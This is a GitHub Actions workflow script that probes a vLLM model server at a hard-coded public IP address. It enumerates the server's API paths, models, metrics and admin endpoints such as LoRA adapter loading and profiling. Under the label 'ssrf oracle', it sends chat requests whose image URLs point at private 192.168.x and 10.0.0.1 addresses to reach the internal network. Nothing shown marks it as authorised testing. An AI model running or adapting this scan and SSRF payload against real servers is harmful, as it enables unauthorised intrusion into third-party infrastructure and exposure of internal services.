name: ul5685vllm3
on:
  workflow_dispatch:
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - name: probe
        run: |
          B=http://123.184.7.135:8000
          echo "=== openapi paths"
          curl -s -m 15 "$B/openapi.json" -o /tmp/o.json -w 'o %{http_code} %{size_download}\n'
          python3 -c "import json;d=json.load(open('/tmp/o.json'));print('\n'.join(sorted(d.get('paths',{}).keys())));print('TITLE',d.get('info'))" 2>&1 | head -60
          echo "=== models/info"
          curl -s -m 10 "$B/v1/models" -w '\n m %{http_code}\n' | head -c 600; echo
          curl -s -m 10 -D /tmp/h "$B/health" -o /dev/null; grep -iE 'server|x-|date' /tmp/h | head -5
          curl -s -m 10 "$B/metrics" | grep -iE 'vllm.*(version|info)|python_info' | head -5
          echo "=== POST routes"
          for p in /v1/load_lora_adapter /v1/unload_lora_adapter /scale_elastic_ep /start_profile /stop_profile /tokenize; do
            c=$(curl -s -o /tmp/x -m 10 -w '%{http_code}' -X POST -H 'Content-Type: application/json' -d '{}' "$B$p"); echo "POST $p -> $c $(head -c 160 /tmp/x|tr -d '\n')"
          done
          echo "=== invocations variants"
          curl -s -m 15 -X POST -H 'Content-Type: application/json' -d '{"inputs":"hi","parameters":{"max_new_tokens":2}}' "$B/invocations" -w '\n inv %{http_code}\n' | head -c 400; echo
          echo "=== ssrf oracle"
          for t in 192.168.0.22:14998/files 192.168.0.23:18081/ 192.168.0.23:18086/ 192.168.0.24:18086/health 192.168.0.20:18086/ 192.168.0.29:18086/ 192.168.0.20:18081/ 192.168.0.29:18081/ 192.168.0.1:80/ 10.0.0.1:80/; do
            r=$(curl -s -m 20 -o /tmp/y -w '%{http_code}' -X POST -H 'Content-Type: application/json' -d "{\"model\":\"m\",\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":\"text\",\"text\":\"hi\"},{\"type\":\"image_url\",\"image_url\":{\"url\":\"http://$t\"}}]}],\"max_tokens\":1}" "$B/v1/chat/completions")
            echo "img http://$t -> $r $(head -c 110 /tmp/y|tr -d '\n')"
          done
          echo "=== 18081 direct"
          curl -s -m 8 "http://123.184.7.135:18081/" -w '\n 18081 %{http_code}\n' | head -c 300; echo
          curl -s -m 8 "http://123.184.7.135:18081/health" -w '\n 18081h %{http_code}\n' | head -c 200; echo
          echo DONE
